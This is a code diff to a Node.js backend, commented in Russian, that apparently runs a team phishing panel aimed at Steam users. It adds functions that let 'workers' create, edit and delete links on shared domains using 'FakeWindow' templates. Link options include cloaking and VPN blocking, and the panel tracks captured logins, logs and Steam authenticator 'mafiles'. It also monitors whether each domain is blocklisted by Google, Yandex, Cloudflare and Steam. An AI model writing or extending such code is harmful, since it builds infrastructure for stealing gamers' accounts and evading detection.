@@ -42,11 +42,81 @@ function pickActualIp(ips) {
   return ips?.ip || ips?.[0] || "";
 }
 
+function sumStatCounts(stats = []) {
+  const out = {};
+  for (const row of Array.isArray(stats) ? stats : []) {
+    const action = row?.action || "Unknown";
+    out[action] = (out[action] || 0) + (Number(row?.count) || 0);
+  }
+  return out;
+}
+
+function serializeDomainStats(stats) {
+  const counts = sumStatCounts(stats);
+  return {
+    views: counts.PageVisit || 0,
+    clicks: counts.AuthVisit || 0,
+    auths: counts.AuthVisit || 0,
+    logs: counts.Log || 0,
+    mafiles: counts.MaFile || 0,
+  };
+}
+
+function aggregateLinkStats(links = []) {
+  const merged = [];
+  for (const link of links) {
+    if (Array.isArray(link?.stats)) merged.push(...link.stats);
+  }
+  return serializeDomainStats(merged);
+}
+
+function isDomainPaused(domain) {
+  return String(domain?.status || "").toLowerCase() === "pause";
+}
+
+function extractOwnerIdFromToken(token) {
+  try {
+    const payload = JSON.parse(Buffer.from(String(token).split(".")[1], "base64url").toString("utf8"));
+    const id = Number(payload?.id);
+    return Number.isFinite(id) ? id : null;
+  } catch (_) {
+    return null;
+  }
+}
+
+function serializeBanCheck(value) {
+  const raw = String(value || "NoInfo");
+  return {
+    raw,
+    banned: raw === "Banned",
+    clean: raw === "NotBanned",
+  };
+}
+
+function serializeBanData(banData) {
+  if (!banData || typeof banData !== "object") return null;
+  let updatedAt = null;
+  const ts = Number(banData.updatedAt);
+  if (Number.isFinite(ts) && ts > 0) {
+    const date = new Date(ts > 1e12 ? ts : ts * 1000);
+    if (!Number.isNaN(date.getTime())) updatedAt = date.toISOString();
+  }
+  return {
+    updatedAt,
+    whois: serializeBanCheck(banData.bannedAtWhois),
+    cloudflare: serializeBanCheck(banData.bannedAtCloudFlare),
+    google: serializeBanCheck(banData.bannedAtChrome),
+    yandex: serializeBanCheck(banData.bannedAtYandex),
+    steam: serializeBanCheck(banData.bannedAtSteam),
+  };
+}
+
 function serializeDomain(domain, ownerId = null) {
   const own =
     ownerId != null && Number.isFinite(Number(ownerId))
       ? Number(domain?.owner) === Number(ownerId)
-      : false;
+      : Boolean(domain?.isOwner);
+  const status = String(domain?.status || "");
   return {
     id: domain.id,
     domain: domain.domain || "",
@@ -56,11 +126,17 @@ function serializeDomain(domain, ownerId = null) {
     isTeamPublic: domain.isTeamPublic === true || domain.isPublic === true,
     ip: domain.ip || "",
     service: domain.service || "Steam",
-    status: domain.status || "",
+    status,
+    isPaused: status.toLowerCase() === "pause",
+    createdAt: domain.createdAt || null,
+    linksCount: Number(domain.linksCount || 0),
+    stats: serializeDomainStats(domain.stats),
+    ns: domain.ns || [],
+    banChecks: serializeBanData(domain.banData),
   };
 }
 
-function serializeLink(link) {
+function serializeLink(link, domainPaused = false) {
   const template = link.template;
   const templateId =
     template && typeof template === "object"
@@ -70,6 +146,8 @@ function serializeLink(link) {
     (template && typeof template === "object" && template.name) ||
     link.templateName ||
     "";
+  const steam = link.steam && typeof link.steam === "object" ? link.steam : {};
+  const linkStatus = String(link.status || "").toLowerCase();
   return {
     id: link.id,
     path: link.path || "",
@@ -78,6 +156,20 @@ function serializeLink(link) {
     template: templateId,
     templateName,
     owner: link.owner ?? null,
+    online: Number(link.online || 0),
+    stats: serializeDomainStats(link.stats),
+    iframe: Boolean(link.iframe),
+    cloaking: Boolean(link.cloaking),
+    ban_vpn: Boolean(link.ban_vpn),
+    randPath: Boolean(link.randPath),
+    isPaused: domainPaused || linkStatus === "pause",
+    steam: {
+      logError: (steam.logError ?? link.logError) !== false,
+      tradeError: (steam.tradeError ?? link.tradeError) !== false,
+      mafileError: Boolean(steam.mafileError ?? link.mafileError),
+      mafileSteamRedirect:
+        (steam.mafileSteamRedirect ?? link.mafileSteamRedirect) !== false,
+    },
   };
 }
 
@@ -114,17 +206,69 @@ async function withWorkerPanel(user, fn) {
   }
 }
 
-/** Список доменов через team API key — без личного аккаунта админа. */
-async function listDomains(_adminUser) {
+/** Список доменов — team key + фильтр доступных воркеру. */
+async function listDomains(user) {
   try {
     const payload = await getTeamDomains(0, 50);
-    const rows = (payload?.rows || []).map((d) => serializeDomain(d, null));
+    let ownerId = null;
+    let panelUsername = user?.panelUsername || "team";
+
+    if (user?.panelUsername && user?.panelPassword) {
+      try {
+        const auth = await authCredentials(user.panelUsername, user.panelPassword);
+        ownerId = extractOwnerIdFromToken(auth.token);
+        panelUsername = user.panelUsername;
+      } catch (_) {
+        // fallback: все публичные домены команды
+      }
+    }
+
+    let rows = payload?.rows || [];
+    if (ownerId != null) {
+      rows = filterAvailableDomains(rows, ownerId);
+    }
+
+    let domains = rows.map((d) => serializeDomain(d, ownerId));
+
+    if (user?.panelUsername && user?.panelPassword && ownerId != null) {
+      try {
+        domains = await withWorkerPanel(user, async ({ token }) => {
+          const workerId = extractOwnerIdFromToken(token) ?? ownerId;
+          return Promise.all(
+            domains.map(async (row) => {
+              try {
+                const linksPayload = await getSteamLinks(token, row.id, 0, 100);
+                const myLinks = filterActiveSteamLinks(linksPayload?.rows || []).filter(
+                  (link) => Number(link.owner) === Number(workerId)
+                );
+                return {
+                  ...row,
+                  linksCount: myLinks.length,
+                  stats: aggregateLinkStats(myLinks),
+                  online: myLinks.reduce((sum, link) => sum + Number(link.online || 0), 0),
+                };
+              } catch {
+                return {
+                  ...row,
+                  linksCount: 0,
+                  stats: serializeDomainStats([]),
+                  online: 0,
+                };
+              }
+            })
+          );
+        });
+      } catch (_) {
+        // team key list без персональной статистики
+      }
+    }
+
     return {
-      ownerId: null,
-      panelUsername: "team",
-      totalOnline: rows.reduce((sum, row) => sum + row.online, 0),
-      ownCount: rows.filter((row) => row.isTeamPublic).length,
-      domains: rows,
+      ownerId,
+      panelUsername,
+      totalOnline: domains.reduce((sum, row) => sum + row.online, 0),
+      ownCount: domains.filter((row) => row.isOwn).length,
+      domains,
       viaTeamKey: true,
     };
   } catch (error) {
@@ -143,6 +287,54 @@ async function resolveDomainMap() {
   return map;
 }
 
+async function getWorkerDomainDetail(user, domainId) {
+  const domainMap = await resolveDomainMap();
+  const domain = domainMap.get(Number(domainId));
+  if (!domain) {
+    const err = new Error("Домен недоступен");
+    err.status = 404;
+    throw err;
+  }
+
+  if (!user?.panelUsername || !user?.panelPassword) {
+    const err = new Error("У воркера нет аккаунта панели сайтов");
+    err.status = 400;
+    throw err;
+  }
+
+  const domainPaused = isDomainPaused(domain);
+
+  return withWorkerPanel(user, async ({ token }) => {
+    const ownerId = extractOwnerIdFromToken(token);
+    const available = filterAvailableDomains([domain], ownerId);
+    if (!available.length) {
+      const err = new Error("Домен недоступен");
+      err.status = 404;
+      throw err;
+    }
+
+    const linksPayload = await getSteamLinks(token, domainId, 0, 100);
+    const myLinks = filterActiveSteamLinks(linksPayload?.rows || []).filter(
+      (link) => Number(link.owner) === Number(ownerId)
+    );
+    const workerOnline = myLinks.reduce((sum, link) => sum + Number(link.online || 0), 0);
+    const links = myLinks.map((link) => serializeLink(link, domainPaused));
+
+    return {
+      ownerId,
+      domain: {
+        ...serializeDomain(domain, ownerId),
+        linksCount: links.length,
+        stats: aggregateLinkStats(myLinks),
+        online: workerOnline,
+        bindType: Array.isArray(domain.ns) && domain.ns.length ? "cloudflare" : "ip",
+        bindNs: domain.ns || [],
+      },
+      links,
+    };
+  });
+}
+
 async function getDomainDetail(adminUser, domainId) {
   const domainMap = await resolveDomainMap();
   const domain = domainMap.get(Number(domainId));
@@ -152,12 +344,13 @@ async function getDomainDetail(adminUser, domainId) {
     throw err;
   }
 
-  // Ссылки владельца (team key) + рефералки воркеров из Mongo.
   let ownerLinks = [];
   try {
     await withAdminPanel(adminUser, async ({ token }) => {
       const linksPayload = await getSteamLinks(token, domainId, 0, 100);
-      ownerLinks = filterActiveSteamLinks(linksPayload?.rows || []).map(serializeLink);
+      ownerLinks = filterActiveSteamLinks(linksPayload?.rows || []).map((link) =>
+        serializeLink(link, isDomainPaused(domain))
+      );
     });
   } catch (_) {
     // Админ без панели — только рефералки из Mongo.
@@ -325,8 +518,9 @@ async function disableTemplateById(_adminUser, templateId) {
   return { templates };
 }
 
-async function createLink(adminUser, domainId, { path = "", templateId, windowType } = {}) {
-  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
+async function createWorkerLink(user, domainId, options = {}) {
+  return withWorkerPanel(user, async ({ token }) => {
+    const ownerId = extractOwnerIdFromToken(token);
     const payload = await getDomains(token, 0, 50);
     const domain = filterAvailableDomains(payload?.rows || [], ownerId).find(
       (row) => Number(row.id) === Number(domainId)
@@ -336,7 +530,12 @@ async function createLink(adminUser, domainId, { path = "", templateId, windowTy
       err.status = 404;
       throw err;
     }
-    const tpl = Number(templateId);
+    if (isDomainPaused(domain)) {
+      const err = new Error("Домен на паузе — нельзя создавать или редактировать ссылки");
+      err.status = 403;
+      throw err;
+    }
+    const tpl = Number(options.templateId);
     if (!Number.isFinite(tpl) || tpl < 1) {
       const err = new Error("Выберите шаблон");
       err.status = 400;
@@ -347,22 +546,148 @@ async function createLink(adminUser, domainId, { path = "", templateId, windowTy
       err.status = 400;
       throw err;
     }
-    const cleanPath = String(path || "").trim().replace(/^\/+/, "");
+    const cleanPath = String(options.path || "").trim().replace(/^\/+/, "");
+    const hasPath = Boolean(cleanPath);
     const created = await createSteamLink(token, {
       path: cleanPath,
-      windowType: normalizeWindowType(windowType || "FakeWindow"),
+      windowType: normalizeWindowType(options.windowType || "FakeWindow"),
       domain: Number(domainId),
       template: tpl,
-      cloaking: false,
-      ban_vpn: false,
-      iframe: true,
-      logError: true,
-      mafileError: false,
-      mafileSteamRedirect: true,
-      tradeError: true,
-      randPath: !cleanPath,
+      cloaking: Boolean(options.cloaking),
+      ban_vpn: Boolean(options.ban_vpn),
+      iframe: options.iframe !== false,
+      logError: options.logError !== false,
+      mafileError: Boolean(options.mafileError),
+      mafileSteamRedirect: options.mafileSteamRedirect !== false,
+      tradeError: options.tradeError !== false,
+      randPath: options.randPath != null ? Boolean(options.randPath) : !hasPath,
     });
-    return { link: serializeLink(created?.data || created || {}) };
+    return {
+      link: serializeLink(created?.data || created || {}, isDomainPaused(domain)),
+    };
+  });
+}
+
+async function updateWorkerLink(user, domainId, linkId, options = {}) {
+  return withWorkerPanel(user, async ({ token }) => {
+    const ownerId = extractOwnerIdFromToken(token);
+    const payload = await getDomains(token, 0, 50);
+    const domain = filterAvailableDomains(payload?.rows || [], ownerId).find(
+      (row) => Number(row.id) === Number(domainId)
+    );
+    if (!domain) {
+      const err = new Error("Домен недоступен");
+      err.status = 404;
+      throw err;
+    }
+    const linksPayload = await getSteamLinks(token, domainId, 0, 100);
+    const link = filterActiveSteamLinks(linksPayload?.rows || []).find(
+      (row) => Number(row.id) === Number(linkId) && Number(row.owner) === Number(ownerId)
+    );
+    if (!link) {
+      const err = new Error("Ссылка не найдена");
+      err.status = 404;
+      throw err;
+    }
+
+    const tpl = Number(options.templateId);
+    if (!Number.isFinite(tpl) || tpl < 1) {
+      const err = new Error("Выберите шаблон");
+      err.status = 400;
+      throw err;
+    }
+    if (!(await isTemplateVisible(tpl))) {
+      const err = new Error("Шаблон недоступен. Включите его ID в разделе «Шаблоны».");
+      err.status = 400;
+      throw err;
+    }
+
+    const patch = {
+      windowType: normalizeWindowType(options.windowType || link.windowType),
+      template: tpl,
+      iframe: options.iframe !== false,
+      cloaking: Boolean(options.cloaking),
+      logError: options.logError !== false,
+      mafileError: Boolean(options.mafileError),
+      mafileSteamRedirect: options.mafileSteamRedirect !== false,
+      tradeError: options.tradeError !== false,
+    };
+    if (options.path !== undefined) {
+      patch.path = String(options.path || "").trim().replace(/^\/+/, "");
+    }
+
+    const updated = await updateSteamLink(token, domainId, linkId, patch);
+    return {
+      link: serializeLink(updated?.data || updated || link, isDomainPaused(domain)),
+    };
+  });
+}
+
+async function deleteWorkerLink(user, domainId, linkId) {
+  return withWorkerPanel(user, async ({ token }) => {
+    const ownerId = extractOwnerIdFromToken(token);
+    const linksPayload = await getSteamLinks(token, domainId, 0, 100);
+    const link = filterActiveSteamLinks(linksPayload?.rows || []).find(
+      (row) => Number(row.id) === Number(linkId) && Number(row.owner) === Number(ownerId)
+    );
+    if (!link) {
+      const err = new Error("Ссылка не найдена");
+      err.status = 404;
+      throw err;
+    }
+    await deleteSteamLink(token, domainId, linkId, {
+      windowType: link.windowType || "FakeWindow",
+    });
+    return { ok: true };
+  });
+}
+
+async function createLink(adminUser, domainId, options = {}) {
+  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
+    const payload = await getDomains(token, 0, 50);
+    const domain = filterAvailableDomains(payload?.rows || [], ownerId).find(
+      (row) => Number(row.id) === Number(domainId)
+    );
+    if (!domain) {
+      const err = new Error("Домен недоступен");
+      err.status = 404;
+      throw err;
+    }
+    if (isDomainPaused(domain)) {
+      const err = new Error("Домен на паузе — нельзя создавать или редактировать ссылки");
+      err.status = 403;
+      throw err;
+    }
+    const tpl = Number(options.templateId);
+    if (!Number.isFinite(tpl) || tpl < 1) {
+      const err = new Error("Выберите шаблон");
+      err.status = 400;
+      throw err;
+    }
+    if (!(await isTemplateVisible(tpl))) {
+      const err = new Error("Шаблон недоступен. Включите его ID в разделе «Шаблоны».");
+      err.status = 400;
+      throw err;
+    }
+    const cleanPath = String(options.path || "").trim().replace(/^\/+/, "");
+    const hasPath = Boolean(cleanPath);
+    const created = await createSteamLink(token, {
+      path: cleanPath,
+      windowType: normalizeWindowType(options.windowType || "FakeWindow"),
+      domain: Number(domainId),
+      template: tpl,
+      cloaking: Boolean(options.cloaking),
+      ban_vpn: Boolean(options.ban_vpn),
+      iframe: options.iframe !== false,
+      logError: options.logError !== false,
+      mafileError: Boolean(options.mafileError),
+      mafileSteamRedirect: options.mafileSteamRedirect !== false,
+      tradeError: options.tradeError !== false,
+      randPath: options.randPath != null ? Boolean(options.randPath) : !hasPath,
+    });
+    return {
+      link: serializeLink(created?.data || created || {}, isDomainPaused(domain)),
+    };
   });
 }
 
@@ -530,6 +855,7 @@ async function deleteTeamReferral(_adminUser, { telegramId, domainId }) {
 
 module.exports = {
   listDomains,
+  getWorkerDomainDetail,
   getDomainDetail,
   previewAddDomain,
   addDomain,
@@ -539,6 +865,9 @@ module.exports = {
   enableTemplateById,
   renameTemplateById,
   disableTemplateById,
+  createWorkerLink,
+  updateWorkerLink,
+  deleteWorkerLink,
   createLink,
   listWorkers,
   listTeamReferrals,
